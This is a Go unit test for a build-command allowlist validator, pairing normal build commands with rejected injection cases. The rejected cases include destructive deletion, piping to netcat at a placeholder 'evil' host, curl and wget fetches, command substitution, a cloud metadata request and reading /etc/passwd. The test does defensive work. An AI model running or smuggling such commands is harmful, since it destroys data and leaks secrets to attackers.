package service

import "testing"

func TestValidateBuildCmd(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
	}{
		// legitimate build commands
		{"npm run build", true},
		{"pip install -e . && python -m pytest", true},
		{"go build -o main ./cmd", true},
		{"./mvnw clean package", true},
		{"docker build -t app .", true},
		// injection / disallowed commands
		{"npm install && rm -rf /", false},       // rm not allowlisted
		{"npm install; curl http://evil", false}, // ';' separator
		{"npm install | nc evil 4444", false},    // pipe
		{"npm install $(curl http://evil)", false},
		{"curl http://169.254.169.254", false}, // curl not allowlisted
		{"cat /etc/passwd > /tmp/x", false},    // cat + redirect
		{"wget http://evil/x", false},          // wget not allowlisted
		{"", false},                            // empty
		{"npm install & background", false},    // single '&'
		{"sh -c 'rm -rf /'", false},            // sh not allowlisted
	}
	for _, c := range cases {
		err := validateBuildCmd(c.cmd)
		got := err == nil
		if got != c.want {
			t.Errorf("validateBuildCmd(%q) = %v (err=%v), want %v", c.cmd, got, err, c.want)
		}
	}
}
